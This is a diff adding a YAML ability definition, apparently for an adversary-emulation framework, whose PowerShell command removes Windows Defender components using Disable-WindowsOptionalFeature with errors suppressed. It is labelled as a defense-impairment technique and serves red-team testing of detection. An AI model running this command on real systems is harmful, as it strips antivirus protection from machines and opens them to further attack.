@@ -1,0 +1,28 @@
+---
+- id: afae914d4839d5194835d8475604e7b8
+  name: Disable Windows Defender with PwSh Disable-WindowsOptionalFeature
+  description: "The following Atomic will attempt to disable Windows-Defender using\
+    \ the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image\
+    \ Servicing and Management tool. \nSimilar to DISM.exe, this cmdlet is used to\
+    \ enumerate, install, uninstall, configure, and update features and packages in\
+    \ Windows images.\nA successful execution will not standard-out any details. Remove\
+    \ the quiet switch if verbosity is needed.\nThis method will remove Defender and\
+    \ it's packages.\nReference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps\n"
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      psh:
+        command: Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-Gui"
+          -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName
+          "Windows-Defender-Features" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature
+          -Online -FeatureName "Windows-Defender" -NoRestart -ErrorAction Ignore;
+          Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-ApplicationGuard"
+          -NoRestart -ErrorAction Ignore
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
